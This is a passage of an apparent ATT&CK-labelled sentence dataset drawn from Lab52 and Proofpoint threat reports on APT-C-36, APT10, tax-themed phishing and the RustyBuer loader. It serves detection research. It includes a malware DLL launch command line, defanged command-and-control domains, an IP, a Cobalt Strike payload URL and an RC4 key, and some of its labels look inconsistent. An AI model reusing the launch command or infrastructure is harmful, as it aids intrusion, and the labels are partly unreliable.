"document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "Lab52 has had access to different very recent spear-phishings and the following summary information has been obtained from the analysis of these mails:", "labels": ["T1566"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "* They usually use different types of url shorteners in their mailings.", "labels": ["T1566"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "* We have also seen links to docs.google.com, mediafire and onedrive to download the samples inside some malspam emails.", "labels": ["T1566"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "* Their most popular malware is LimeRAT, although many others have been found as indicated in the reports.", "labels": [], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "VJWorm has also been seen recently with different techniques for exfiltration.", "labels": ["TA0010"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "* It has also been observed from some spear-phishings the exfiltration by Yopmail\u2019s HTTPS webmail service.", "labels": ["T1566", "T1020"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "From this information, the infrastructure used by the attackers as command and control servers when executing the malware has been analyzed and the following graph has been obtained:", "labels": ["TA0011"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "* This cluster coincides with part of the domains registered in the report of the Chinese company 360 on APT-C-36.", "labels": ["G0099"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "Lab52 hypothesis is that attackers compromise routers with default credentials and use them as a frontend for their real command and control server.", "labels": ["TA0011", "T1583"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "* The emails are well written and are almost always related to financial matters, specifically related to debt.", "labels": ["T1566"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "* Currently, the attackers are not using malware developed by themselves and are using public malware projects such as LimeRAT.", "labels": [], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "* Attackers are using high ports to communicate with command and control servers.", "labels": ["T1571"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "* Attackers are probably using multi-level command and control architectures to hide the main command and control server.", "labels": ["T1104"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "* Attackers use shorteners for links in emails.", "labels": ["T1566"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "The main tools of this threat actor, are built as DLL files, and launched with this commands:", "labels": ["T1218"], "document": "lab52_2020-02-12_intelligence-operation-against-targets-in"}, {"sentence": "* \u201cC:\\Windows\\System32\\rundll32.exe\u201d shell32.dll,ShellExec\\_RunDLL regsvr32 /s C:\\ProgramData\\pubpool.dll /i:process104.dll", "labels": ["T1218", "T1218"], "document": "lab52_2020-02-12_intelligence-operation-against-targets-in"}, {"sentence": "Lab52 has analyzed pubpool.dll and this component has code to decrypt and load files, working as a dll loader.", "labels": ["T1140"], "document": "lab52_2020-02-12_intelligence-operation-against-targets-in"}, {"sentence": "In the next picture, you can see one example of a dll being decrypted by pubpool in memory:", "labels": ["T1140"], "document": "lab52_2020-02-12_intelligence-operation-against-targets-in"}, {"sentence": "It\u2019s main purpose is to infect USB devices.", "labels": ["T1091"], "document": "lab52_2020-02-12_intelligence-operation-against-targets-in"}, {"sentence": "process100.dll is decrypted and mapped as inject\\_host.dll.", "labels": ["T1218"], "document": "lab52_2020-02-12_intelligence-operation-against-targets-in"}, {"sentence": "**runtime\\_report.dll** is decrypted and mapped as **TinyMet.dll**.", "labels": ["T1218"], "document": "lab52_2020-02-12_intelligence-operation-against-targets-in"}, {"sentence": "This module deploys TinyMET[1], a \u201ctiny\u201d meterpreter stager.", "labels": [], "document": "lab52_2020-02-12_intelligence-operation-against-targets-in"}, {"sentence": "This TinyMet version has a Mutex TEST\\_9I89JNDBPWQ9ND:", "labels": [], "document": "lab52_2020-02-12_intelligence-operation-against-targets-in"}, {"sentence": "TinyMet connects to Internet using a Hardcoded domain and User-Agent that can be seen in the next picture:", "labels": [], "document": "lab52_2020-02-12_intelligence-operation-against-targets-in"}, {"sentence": "During 2019, some technical traces were detected and this traces where potentially related to certain APT groups presumably associated with the People\u2019s Republic of China (APT10) that would be carrying out malicious campaigns against various targets like critical infrastructures \u00a0organizations among others ([14]) ([15]).", "labels": ["G0045"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "This campaign, due to the macros used, is likely to be attributed to APT10, a group allegedly linked to the Ministry of Security and Intelligence of China ([1]) ([18]).", "labels": ["G0045"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "The malware used was \u201cLookback.", "labels": ["S0582"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "The spear phishing carried out an impersonation of GEC (Global Energy Certification) to offer certain certification courses ([2]).", "labels": ["T1566"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "Several spear phishing emails came from the following malicious domain: globalenergycertification[.]Net. The same domain was used in previous malicious campaigns.", "labels": ["T1566"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "The hostile actor tries to impersonate a licensing agency that is linked to the public sector globalenergycertification[.]Org. In the body of the email, topics are included to impersonate the \u201cGlobal Energy Certification\u201d (GEC).", "labels": ["T1566"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "The word file attached in the email has the macros that once is downloaded and executed infects the systems of the victim ([2]).", "labels": ["T1566", "T1059"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "During the first stages of the infection it was possible to identify that the attackers carried out a reconnaissance phase through SMB scans on the port 445.", "labels": ["T1595"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "This activity was carried out two weeks before to the reception of spear phishing.", "labels": ["T1566"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "*Illustration 4. Spear phishing email body*", "labels": ["T1566"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "It has been identified that Lookback samples use the same C&C 103.253.41 [.45.", "labels": ["S0582"], "document": "lab52_2020-02-18_the-role-of-china-in"}, {"sentence": "APT-C-36 new anti-detection tricks", "labels": ["G0099"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "Lab52 has recently detected an increase in the efforts carried out by APT-C-36 to improve their capabilities to remain undetected by Anti Malware software, using a more complex infection chain than a simple packer, as they have been doing so far.", "labels": ["G0099", "T1027"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "Until now, these binaries were executables packed with common anti-virus circumvention software, but in this case it is an \u201cSFX", "labels": ["T1027"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "When these installers are executed, they create a temporary folder on the system, where they dump all the files they contain, and then execute one of them as an \u201cEntry Point\u201d in the execution/infection chain.", "labels": ["TA0002", "T1074"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "This executable consists of a very small program that simply loads dynamically the library \u201cQuoteworthy.dll\u201d that is near the binary, and calls its exported function \u201cExcluders\u201d, passing as parameters some system APIs resolved by the original executable:", "labels": ["T1204", "T1055"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "The first one (unk\\_6D321170), consists of code that is part of the DLL, and that is in charge of deciphering (with an XOR algorithm) a buffer contained in the .data section of the library.", "labels": ["T1140"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "Inside this buffer, the function ignores out of every 4 bytes (since they are zeros).", "labels": ["T1140"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "After building this buffer, it reserves a memory area with execution permissions and copies there the decoded content.", "labels": ["T1620"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "After that, the first function of this DLL ends and calls the second one, which, at this point of the execution, points to the memory area where it was written the decoded shellcode, and to which it passes as parameter the before mentioned 7-element array.", "labels": ["T1059"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "Once it jumps to that shellcode, using GetProcAddres and GetModuleHandle, it extracts a list of Kernel32 Functions that are \u201chardcoded\u201d:", "labels": ["T1059"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "It loads the \u201cBoondoggle\u201d file with the CreateFile API and makes a decode with the same XOR key as before, from which it decodes a new complete executable and a small \u201cPE Loader\u201d that allows it to load the executable into memory using the technique known as \u201cReflectivePEInjection\u201d either in the process itself or in a remote process.", "labels": ["T1140", "T1055", "T1140"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "After this, it runs the decrypted binary, which repeats the same logic over another section of the \u201cBoondoggle\u201d from which it extracts a second executable, this time consisting of a copy of the \u201cOllyDBG\u201d plug-in called \u201cOllyDBG PE Dumper\u201d which contains overwritten malicious code that is called.", "labels": ["T1140"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "This dll extracts the final threat and in case the initial binary \u201cgospels.exe\u201d had been executed from the installer arriving by mail, it has been observed that it is injected in a legitimate new process \u201ccmd.exe\u201d.", "labels": ["T1055", "T1566"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "On the other hand, in case it is loaded through its persistence in the registry, it is injected in the process \u201cgospels.exe\u201d itself.", "labels": ["T1112", "T1055"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "An interesting point of this stage of infection is that it tries to remove a file called \u201cturpitude.exe\u201d that should be located in the user\u2019s %APPDATA% folder, but no trace has been observed at any point of the analysis, thus it could be an attempt to clean up tools from previous campaigns of this group, although it has not been able to confirm this fact through the analysis of the threat.", "labels": ["T1070"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "Eventually, the final threat remains completely deployed in the memory of the machine, which in this case consists on the \u201cRemcos\u201d remote acces trojan.", "labels": ["S0332"], "document": "lab52_2020-03-23_apt-c-36-new-anti"}, {"sentence": "Since in 2013 the US cybersecurity consultancy Mandiant published its famous report about APT1, showing its links with different agencies presumably associated with the Chinese government, the news about its actions in cyberspace has been significantly increased.", "labels": ["G0006"], "document": "lab52_2020-04-14_china-from-culture-to-conflict"}, {"sentence": "Among others, we find APT15, APT27 or Winnti Group (APT41); the US DoJ\u2019s allegations of cyber espionage towards five Chinese military members associated with the APT1 group; the links that the FBI has established between Zhu Hua and Zhang Shilong and APT10; or the alleged link of PLA unit 61398 (People\u2019s Liberations Army) with APT1.", "labels": ["G0004", "G0096", "G0006", "G0045", "G0006"], "document": "lab52_2020-04-14_china-from-culture-to-conflict"}, {"sentence": "It is not uncommon to find binaries with Mandarin language resources or drivers signed by Chinese companies, which could potentially facilitate a campaign directed against any organization.", "labels": ["G0045"], "document": "lab52_2020-04-14_china-from-culture-to-conflict"}, {"sentence": "During the 2018 South Korea Winter Olympics, the OlympicDestroyer malware paralyzed IT systems, caused outages, and brought down the organization\u2019s websites.", "labels": ["T1499"], "document": "lab52_2020-04-14_china-from-culture-to-conflict"}, {"sentence": "What is relevant about these actions is that, as detailed in the report, the tactics, techniques and procedures (TTP) were those commonly used by the Lazarous group, associated with North Korea.", "labels": ["G0032"], "document": "lab52_2020-04-14_china-from-culture-to-conflict"}, {"sentence": "So far in 2021, Proofpoint identified over 30 discrete campaigns targeting thousands of people from multiple threat actors that leveraged malicious email lures associated with taxes, tax and refund support, and government revenue entities.", "labels": ["T1566"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "At least four threat actor groups tracked by Proofpoint have leveraged tax-themed malicious email campaigns.", "labels": ["T1566"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "Credential theft phishing attempts \u2013 which can be used to target individuals or leveraged for email account takeovers \u2013 accounted for 40% of the tax-themed email campaigns, followed by remote access trojan ([RAT](https://www.proofpoint.com/us/threat-insight/post/threat-insight-2019-review-year-rat)) campaigns at 17%.", "labels": ["TA0006"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "Half of identified tax-themed and related messages containing [malware](https://www.proofpoint.com/us/threat-reference/malware) were used to distribute the Remcos RAT, a commodity malware with extensive data theft and surveillance capabilities.", "labels": ["S0332"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "Other broad tax-themed malware distribution campaigns included Dridex, TrickBot, and ZLoader.", "labels": ["S0384", "S0183"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "Over the course of 2020, threat actors began [increasingly](https://www.csoonline.com/article/3597913/why-excel-4-0-macro-exploits-are-surging.html) leveraging Excel 4.0 (XL4) macros to distribute malware, and this trend has continued in 2021.", "labels": ["T1059"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "Proofpoint observed a 500% increase in tax-themed email threat campaigns delivering weaponized XL4 Macros in the first three months of 2021.", "labels": ["T1566", "T1059"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "(Although Microsoft still supports XL4 macros, the company [suggests](https://support.microsoft.com/en-us/office/working-with-excel-4-0-macros-ba8924d4-e157-4bb2-8d76-2c07ff02e0b8) migrating them to the latest version of Microsoft Visual Basic Application.", "labels": ["T1059", "T1059"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "**TrickBot**", "labels": ["S0183"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "It distributed the TrickBot banking trojan.", "labels": ["S0183"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "TrickBot is designed to steal banking information and acts as an initial payload for additional malware, gaining notoriety in 2018 for distributing Ryuk ransomware which [reportedly](https://www.securitymagazine.com/articles/93769-ryuk-ransomware-responsible-for-one-third-of-all-ransomware-attacks-in-2020) accounted for a third of [ransomware](https://www.proofpoint.com/us/threat-reference/ransomware) distributed by many actors across the threat landscape in 2020.", "labels": ["S0183", "S0446", "T1486", "T1486", "T1486"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "Unlike typically observed activity, this TrickBot campaign distributed malicious Excel files leveraging the XLSB filetype, a lightweight file format that can only be opened in Excel.", "labels": ["T1566"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "Researchers [previously observed](https://www.hornetsecurity.com/en/threat-research/qakbot-distributed-by-xlsb-files/) the multipurpose trojan QBot distributed via XLSB files in October 2020.", "labels": ["T1059"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "**Dridex**", "labels": ["S0384"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "The threat actor Proofpoint tracks as TA575 [distributed](https://www.proofpoint.com/us/blog/security-briefs/threat-actors-target-victims-promising-covid-19-relief-vaccines-and-variant) emails purporting to be from IRS representatives associated with the [American Rescue Plan](https://www.congress.gov/bill/117th-congress/house-bill/1319/text).", "labels": [], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "The emails contained links to download Microsoft Excel documents containing macros that, when enabled, downloaded the Dridex malware designed to steal banking and other personal information.", "labels": ["T1566", "T1204", "T1105", "T1059"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "The TA575 campaign, which began in early March, included almost 16,000 messages and impacted over 1,800 organizations across dozens of verticals.", "labels": [], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "Tax-themed phishing attacks also occur globally, and one campaign Proofpoint identified posed as the United Kingdom\u2019s tax and customs authority, HM Revenue and Customs (HMRC).", "labels": ["T1566"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "The malicious email campaign that began in mid-February 2021 distributed messages with links that led to a fake Self-Employment HMRC tax themed authentication page designed to harvest user credentials.", "labels": ["T1566"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "**TA574**", "labels": [], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "The cybercrime actor TA574 sent almost 40,000 messages in one campaign using lures posing as the IRS and financial representatives.", "labels": [], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "TA574 is an actor operating at a large scale that indiscriminately targets multiple industries and attempts to deliver and install malware like banking trojans.", "labels": [], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "The IRS-themed emails contained malicious Microsoft Excel documents that requested victims enable macros to view content, thereby downloading and executing the [ZLoader](https://www.proofpoint.com/us/blog/threat-insight/zloader-loads-again-new-zloader-variant-returns) malware on a victim machine.", "labels": ["T1566", "T1059", "T1204"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "ZLoader is a typical banking malware that steals credentials and other\u00a0private information\u00a0from users of targeted financial institutions.", "labels": ["TA0006"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "The emails target financial and accounting organizations in North America.", "labels": ["T1566"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "If the recipient replies, they then receive a follow up email with a URL linking to a document that uses macros to drop a downloader that pulls in NetWire RAT.", "labels": ["T1566", "T1105"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "NetWire is typically used by criminal threat actors targeting a wide range of organizations including financial services, businesses, medical companies, and educational institutions.", "labels": ["S0198"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "*Figure 5: Phishing themes matching previous tax-themes campaigns distributing malware.*", "labels": ["T1566"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "Tax season is a popular time for threat actors to conduct email-based attack campaigns designed to steal sensitive information for financial gain.", "labels": ["T1566"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "* **Train users to spot and report malicious email**.", "labels": ["T1566"], "document": "proofpoint_2021-04-15_threat-actors-pair-tax-themed"}, {"sentence": "New Variant of Buer Loader Written in Rust", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Proofpoint researchers identified a new variant of the Buer malware loader distributed via emails masquerading as shipping notices in early April.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "[Buer](https://malpedia.caad.fkie.fraunhofer.de/details/win.buer) is a downloader sold on underground marketplaces that is used as a foothold in compromised networks to distribute other malware, [including ransomware](https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf).", "labels": ["T1486"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Proofpoint first [observed Buer in 2019](https://www.proofpoint.com/us/threat-insight/post/buer-new-loader-emerges-underground-marketplace).", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Proofpoint is calling this new variant RustyBuer.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "* The new Buer variant is written in Rust, an efficient and easy-to-use programming language that is becoming increasingly popular.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Proofpoint is calling this variant RustyBuer.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "* Rewriting the malware in Rust enables the threat actor to better evade existing Buer detection capabilities.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "* Proofpoint observed RustyBuer campaigns delivering Cobalt Strike Beacon as a second-stage payload in some campaigns.", "labels": ["S0154", "S0154"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "* Researchers assess some threat actors may be establishing a foothold with the Buer loader to then sell access to other threat actors.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Proofpoint analysts observed a series of malicious campaigns that delivered the Buer malware loader.", "labels": ["T1566"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "The campaigns generally used DHL-themed phishing emails to distribute malicious Word or Excel documents.", "labels": ["T1566"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "While sharing similar email lure themes, the campaigns distributed two distinct variants of the Buer malware: one was written in C while the other was rewritten in the Rust programming language.", "labels": ["T1566"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Proofpoint dubbed this variant RustyBuer.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "The campaigns also used different lure techniques, with RustyBuer attachments containing more detailed content to better engage the recipient.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "The rewritten malware, and the use of newer lures attempting to appear more legitimate, suggest threat actors leveraging RustyBuer are evolving techniques in multiple ways to both evade detection and attempt to increase successful click rates.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Figure 1: Emails masquerading as DHL shipping themes used to distribute RustyBuer and Buer loaders.", "labels": ["T1566"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Figure 2: Malicious Excel attachment distributing RustyBuer containing multiple security software brand logos in an attempt to add legitimacy to the document.", "labels": ["T1566"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "RustyBuer was embedded directly into the document macro and required user interaction to initiate the infection.", "labels": ["T1059", "T1204"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "This macro leveraged an Application Bypass (Windows Shell DLL via [LOLBAS](https://lolbas-project.github.io/lolbas/Libraries/Shell32/)) to evade detection from endpoint security mechanisms.", "labels": ["T1036"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Once RustyBuer is dropped, it establishes persistence by using a shortcut (.LNK) file which runs at startup.", "labels": ["TA0003", "T1547"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Proofpoint researchers observed RustyBuer distributing Cobalt Strike Beacon as a second-stage payload in some instances, like previous Buer campaigns.", "labels": ["S0154", "S0154"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Cobalt Strike is a legitimate security tool used by penetration testers to emulate adversary activity in a network that is becoming increasingly popular as a tool for threat actors.", "labels": ["S0154"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "These threat actors may be attempting to establish initial access in victim environments to then sell their access to other threat actors in underground marketplaces.", "labels": ["TA0001"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Other security firms have [documented this behavior](https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/) from threat actors using Buer loader previously.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Proofpoint classified the new variant of Buer (RustyBuer) as a rewritten version in Rust based on present anti-analysis features, strings, and encoding and format of the command and control (C2) requests.", "labels": ["TA0011", "TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "2. Rewriting the malware in Rust can enable the threat actor to evade existing Buer detections that are based on features of the malware written in C.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "The malware authors have programmed it in a way that it should maintain compatibility with existing Buer backend C2 servers and panels.", "labels": ["TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "The C2 requests are nearly identical to the requests used in the latest version of Buer.", "labels": ["TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "The C2 functions are handled via HTTP(S) POST requests.", "labels": ["T1071"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "The POST request contains both pseudorandom characters and encrypted information about the compromised system.", "labels": ["T1573"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Figure 6: RustyBuer initial POST request", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Figure 7: Buer Loader initial POST request", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "3. RC4 decryption (the key used in the analyzed samples was \u201ckpM5WOtfo\u201d)", "labels": ["T1573"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "As with Buer, the JSON object returned in the beacon response contains various options on how to download and execute a payload:", "labels": ["T1105"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "+ AccessToken - used to download the payload", "labels": ["T1105"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "+ External - indicates whether the payload is downloaded from the C&C or an external URL", "labels": ["T1105"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "* autorun - indicates whether to setup Registry RunOnce persistence for the payload", "labels": ["T1547"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Despite existing since 2019, the new variant of Buer loader malware suggests threat actors continue to modify their payloads in a likely attempt to evade detection.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "When paired with the attempts by threat actors leveraging RustyBuer to further legitimize their lures, it is possible the attack chain may be more effective in obtaining access and persistence.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "RustyBuer and the original Buer loader have been observed as a first-stage loader for additional payloads including Cobalt Strike and multiple ransomware strains, as well as possibly providing victim access to other threat actors in the underground marketplace.", "labels": ["S0154", "T1486"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "Based on the frequency of RustyBuer campaigns observed by Proofpoint, researchers anticipate we will continue to see the new variant in the future.", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| Serevalutinoffice[.]com | Domain | C&C (RustyBuer) |", "labels": ["TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| orderverification-api[.]com | Domain | C&C (RustyBuer) |", "labels": ["TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| Gerstaonycostumers[.]com | Domain | C&C (RustyBuer) |", "labels": ["TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| authcert-ca[.]com | Domain | C&C (RustyBuer) |", "labels": ["TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| documentssign-api[.]com | Domain | C&C (RustyBuer) |", "labels": ["TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| docusigner-api[.]com | Domain | C&C (RustyBuer) |", "labels": ["TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| Miyfandecompany[.]com | URL | C&C (RustyBuer) |", "labels": ["TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| https://cembank-api[.]com | URL | C&C (RustyBuer) |", "labels": ["TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| http://213.252.244[.]114/ayhtvcgcfcfrgcdxdxdrcrhj | Payload | Cobalt Strike Payload |", "labels": ["S0154"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| 213.252.244[.]114 | IP | Cobalt Strike C&C |", "labels": ["S0154", "TA0011"], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "| https://techlog[.]xyz/page.icore | URL | Buer Payload |", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "2848365 - RustyBuer Checkin", "labels": [], "document": "proofpoint_2021-05-03_new-variant-buer-loader-written"}, {"sentence": "In\u00a0this post,\u00a0we will dive\u00a0further\u00a0into the Theme tier, specifically focusing on invoicing fraud and show how the Email Fraud Taxonomy works in action.", "labels": ["T1566"], "document": "proofpoint_2021-05-06_bec-taxonomy-invoice-fraud"}, {"sentence": "*Figure 1. Email Fraud Taxonomy Framework*", "labels": ["T1566"], "document": "proofpoint_2021-05-06_bec-taxonomy-invoice-fraud"}, {"sentence": "Attacks leveraging supplier relationships can end up costing\u00a0companies\u00a0anywhere from tens of thousands of dollars to multiple millions, making it a\u00a0worthwhile\u00a0example\u00a0to illustrate the Email Fraud Taxonomy Framework.", "labels": ["T1566"], "document": "proofpoint_2021-05-06_bec-taxonomy-invoice-fraud"}, {"sentence": "### Supplier Invoice Fraud and the Email Fraud Taxonomy Framework", "labels": ["T1566"], "document": "proofpoint_2021-05-06_bec-taxonomy-invoice-fraud"}, {"sentence": "Supplier invoice fraud schemes can occur via two\u00a0Deception means\u00a0(per the\u00a0Proofpoint\u00a0Email Fraud Taxonomy Framework\u00a0in Figure 1 above): impersonation and compromise.", "labels": ["T1566"], "document": "proofpoint_2021-05-06_bec-taxonomy-invoice-fraud"}, {"sentence": "This authenticity perception is essential, as email recently regained its status as the top vector for [ransomware](https://www.coveware.com/blog/ransomware-marketplace-report-q4-2020) and threat actors increasingly leverage the supply chain and partner ecosystem to compromise accounts, steal credentials, and siphon funds.", "labels": ["T1486"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "**Microsoft and Google Phishing Examples**", "labels": ["T1566"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "For example, the following credential phishing attempt features a Microsoft SharePoint URL claiming to host a corporate policy and COVID-19 guidelines document.", "labels": ["T1566"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "The document contains a link leading to a fake Microsoft authentication page designed to harvest user credentials.", "labels": ["T1566", "T1056"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "An additional example of a recent fake video conferencing credential phishing campaign featured the \u201c.onmicrosoft.com\u201d domain name.", "labels": ["T1566"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "The 